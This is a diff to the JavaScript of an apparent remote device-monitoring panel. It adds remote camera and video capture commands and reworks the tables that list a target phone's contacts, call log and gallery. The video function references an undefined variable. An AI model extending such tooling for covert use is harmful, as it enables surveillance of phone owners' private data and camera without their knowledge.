@@ -12,7 +12,29 @@ var mp = new Map();
     msg.cmd="screenshot";
     msg=JSON.stringify(msg);
     console.log("sending : "+msg);
-      $("#image_display").html("<h1>Getting new Image</h1>");
+    conn.send(msg);
+  }
+
+  function camera(x){
+    var msg={};
+    msg.device=active_device.device_id;
+    msg.cmd="camera";
+    msg.cam=x;
+    msg=JSON.stringify(msg);
+    console.log("sending : "+msg);
+      $("*").css("cursor", "wait");
+    conn.send(msg);
+  }
+
+  function video(x,fr){
+    var msg={};
+    msg.device=active_device.device_id;
+    msg.cmd="video";
+    msg.cam=x;
+    msg.frames=frames;
+    msg=JSON.stringify(msg);
+    console.log("sending : "+msg);
+      $("*").css("cursor", "wait");
     conn.send(msg);
   }
 
@@ -50,8 +72,7 @@ var mp = new Map();
 
   function build_contacts_table(name){
     $.getJSON("../data/"+name,function(data){
-      var htmlString='<thead><tr><th>ID</th><th>Name</th><th>Number(s)</tr></thead><tbody>';
-
+      var htmlString='<table id="contacts_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>ID</th><th>Name</th><th>Number(s)</tr></thead><tbody>';
       for(var i=0;i<data.length;i++){
         var row="<tr>";
         var numbs=data[i].phones;
@@ -60,17 +81,16 @@ var mp = new Map();
         row+="</tr>";
         htmlString+=row;
       }
-      htmlString+="</tbody>";
+      htmlString+="</tbody></table>";
       $("#contacts_fetch").html(htmlString);
-      $("#contacts_fetch").DataTable();
-      $("#contacts_loader").html('');
+      $("#contacts_fetch_table").DataTable();
       $("*").css("cursor", "default");
     });
   }
 
   function build_call_log_table(name){
     $.getJSON("../data/"+name,function(data){
-      var htmlString='<thead><tr><th>Name</th><th>Number</th><th>Time</th><th>Duration</th><th>Type</th></tr></thead><tbody>';
+      var htmlString='<table id="calllog_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>Name</th><th>Number</th><th>Time</th><th>Duration</th><th>Type</th></tr></thead><tbody>';
 
       for(var i=0;i<data.length;i++){
         var row="<tr>";
@@ -89,16 +109,16 @@ var mp = new Map();
         row+="</tr>";
         htmlString+=row;
       }
-      htmlString+="</tbody>";
+      htmlString+="</tbody></table>";
       $("#calllog_fetch").html(htmlString);
-      $("#calllog_fetch").DataTable();
+      $("#calllog_fetch_table").DataTable();
       $("*").css("cursor", "default");
     });
   }
 
   function preview_base64(img){
-    img="<img src=\"data:image/jpg;base64,"+img+"\" class=\"img img-responsive\">";
-    $("#preview_window").html(img);
+    img="data:image/jpg;base64,"+img;
+    $("#preview_image").attr("src",img);
   }
   function gallery_preview(x){
     var img=$(x).attr("data-image");
@@ -130,7 +150,7 @@ var mp = new Map();
   function build_gallery_fetcher(){
     $.getJSON("../db/get_gallery.php?device_id="+active_device.device_id,function(data){
       console.log(data[0]);
-      var htmlString='<thead><tr><th>Folder</th><th>Path</th><th>Cache</th></thead><tbody>';
+      var htmlString='<table id="gallery_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>Folder</th><th>Path</th><th>Cache</th></thead><tbody>';
       for(var i=0;i<data.length;i++){
         var row="<tr>";
         var ct="";
@@ -143,9 +163,9 @@ var mp = new Map();
         row+="</tr>";
         htmlString+=row;
       }
-      htmlString+="</tbody>";
+      htmlString+="</tbody></table>";
       $("#gallery_fetch").html(htmlString);
-      $("#gallery_fetch").DataTable();
+      $("#gallery_fetch_table").DataTable();
       $("*").css("cursor", "default");
     });
   }
@@ -173,6 +193,10 @@ var mp = new Map();
       preview_base64(msg.response);
       console.log(msg.response.length);
       glorify(msg.item,msg.response);
+      break;
+      case "camera":
+      preview_base64(msg.response);
+      $("*").css("cursor", "default");
       break;
       case "response_error":
       alert("Error : "+msg.message);
